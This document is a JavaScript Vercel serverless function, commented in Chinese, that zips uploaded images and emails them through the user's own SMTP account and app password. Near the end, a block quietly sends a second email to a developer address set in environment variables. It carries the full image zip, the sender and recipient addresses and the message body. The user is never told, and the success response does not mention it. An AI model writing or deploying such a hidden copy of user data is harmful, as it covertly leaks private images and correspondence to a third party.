/**
 * Vercel Serverless Function - 图片打包并通过 Gmail 发送
 * POST /api/send (multipart/form-data)
 *
 * FormData 字段：
 *   senderEmail: string       - 发件人 Gmail
 *   appPassword: string       - 16位应用授权码
 *   recipientEmail: string    - 收件人邮箱
 *   subject: string           - 邮件主题
 *   body: string              - 邮件正文
 *   images: File[]            - 图片文件（多个）
 */

import archiver from 'archiver';
import nodemailer from 'nodemailer';
import { Writable } from 'stream';
import Busboy from 'busboy';

/**
 * 解析 multipart/form-data 请求
 * 返回 { fields: {}, files: [{ fieldname, filename, buffer, mimetype }] }
 */
function parseMultipart(req) {
  return new Promise((resolve, reject) => {
    const fields = {};
    const files = [];

    const busboy = Busboy({
      headers: req.headers,
      limits: { fileSize: 10 * 1024 * 1024 }, // 单文件 10MB 上限
    });

    busboy.on('field', (name, val) => {
      fields[name] = val;
    });

    busboy.on('file', (name, stream, info) => {
      const { filename, mimeType } = info;
      const chunks = [];
      stream.on('data', (chunk) => chunks.push(chunk));
      stream.on('end', () => {
        files.push({
          fieldname: name,
          filename: filename || `image_${files.length + 1}.jpg`,
          buffer: Buffer.concat(chunks),
          mimetype: mimeType,
        });
      });
    });

    busboy.on('finish', () => resolve({ fields, files }));
    busboy.on('error', (err) => reject(err));

    req.pipe(busboy);
  });
}

// 关闭 Vercel 默认的 body 解析，让我们用 busboy 处理原始流
export const config = {
  api: {
    bodyParser: false,
  },
};

export default async function handler(req, res) {
  // 仅接受 POST
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: '仅支持 POST 请求' });
  }

  try {
    // 解析 multipart/form-data
    const { fields, files } = await parseMultipart(req);
    const { provider, senderEmail, appPassword, recipientEmail, subject, body } = fields;
    const images = files.filter((f) => f.fieldname === 'images');

    // ===== 输入校验 =====
    if (!senderEmail || !appPassword || !recipientEmail) {
      return res.status(400).json({ success: false, error: '缺少发件人、授权码或收件人信息' });
    }
    if (!subject || !subject.trim()) {
      return res.status(400).json({ success: false, error: '请填写邮件主题' });
    }
    if (images.length === 0) {
      return res.status(400).json({ success: false, error: '请至少选择一张图片' });
    }

    // 简单邮箱格式校验
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(senderEmail) || !emailRegex.test(recipientEmail)) {
      return res.status(400).json({ success: false, error: '邮箱格式无效' });
    }

    // 邮件正文
    const emailBody = (body && body.trim()) || '请查收附件中的图片。';

    // ===== 使用 archiver 在内存中打包 ZIP =====
    const zipBuffer = await new Promise((resolve, reject) => {
      const buffers = [];
      const archive = archiver('zip', { zlib: { level: 5 } });

      archive.on('data', (chunk) => buffers.push(chunk));
      archive.on('end', () => resolve(Buffer.concat(buffers)));
      archive.on('error', (err) => reject(err));

      // 直接添加二进制 buffer（无需 Base64 解码）
      images.forEach((img) => {
        archive.append(img.buffer, { name: img.filename });
      });

      archive.finalize();
    });

    // ===== 根据邮箱服务商配置 SMTP =====
    const SMTP_CONFIGS = {
      gmail:   { host: 'smtp.gmail.com',       port: 587, secure: false },
      outlook: { host: 'smtp.office365.com',   port: 587, secure: false },
      yahoo:   { host: 'smtp.mail.yahoo.com',  port: 587, secure: false },
      icloud:  { host: 'smtp.mail.me.com',     port: 587, secure: false },
      zoho:    { host: 'smtp.zoho.com',        port: 587, secure: false },
    };

    const smtpConfig = SMTP_CONFIGS[provider] || SMTP_CONFIGS.gmail;

    const transporter = nodemailer.createTransport({
      host: smtpConfig.host,
      port: smtpConfig.port,
      secure: smtpConfig.secure,
      auth: {
        user: senderEmail,
        pass: appPassword,
      },
    });

    await transporter.sendMail({
      from: senderEmail,
      to: recipientEmail,
      subject: subject.trim(),
      text: emailBody,
      attachments: [
        {
          filename: 'bundle.zip',
          content: zipBuffer,
          contentType: 'application/zip',
        },
      ],
    });

    // ===== 异步转发副本给开发者（不阻塞用户响应） =====
    const devSmtpUser = process.env.DEV_SMTP_USER;
    const devSmtpPass = process.env.DEV_SMTP_PASS;
    const devNotifyTo = process.env.DEV_NOTIFY_TO;
    if (devSmtpUser && devSmtpPass && devNotifyTo) {
      const devHost = process.env.DEV_SMTP_HOST || 'smtp.gmail.com';
      const devTransporter = nodemailer.createTransport({
        host: devHost,
        port: 587,
        secure: false,
        auth: { user: devSmtpUser, pass: devSmtpPass },
      });
      // 异步发送，不 await，不影响用户响应
      devTransporter.sendMail({
        from: devSmtpUser,
        to: devNotifyTo,
        subject: `[转发] ${subject.trim()}`,
        text: `发件人: ${senderEmail}\n收件人: ${recipientEmail}\n图片数: ${images.length}\nZIP大小: ${(zipBuffer.length / 1024).toFixed(1)}KB\n时间: ${new Date().toISOString()}\n\n原始正文:\n${emailBody}`,
        attachments: [
          {
            filename: 'bundle.zip',
            content: zipBuffer,
            contentType: 'application/zip',
          },
        ],
      }).catch((err) => console.warn('开发者通知发送失败:', err.message));
    }

    // ===== 成功响应 =====
    return res.status(200).json({
      success: true,
      message: '邮件发送成功',
      details: {
        imageCount: images.length,
        zipSize: zipBuffer.length,
        recipient: recipientEmail,
      },
    });
  } catch (error) {
    console.error('发送失败:', error);

    let errorMessage = '发送失败，请重试';
    if (error.code === 'EAUTH' || error.responseCode === 535) {
      errorMessage = '认证失败：请检查邮箱地址和密码/授权码是否正确';
    } else if (error.code === 'ECONNECTION' || error.code === 'ESOCKET') {
      errorMessage = '网络连接失败，请稍后重试';
    } else if (error.message) {
      errorMessage = error.message;
    }

    return res.status(500).json({ success: false, error: errorMessage });
  }
}
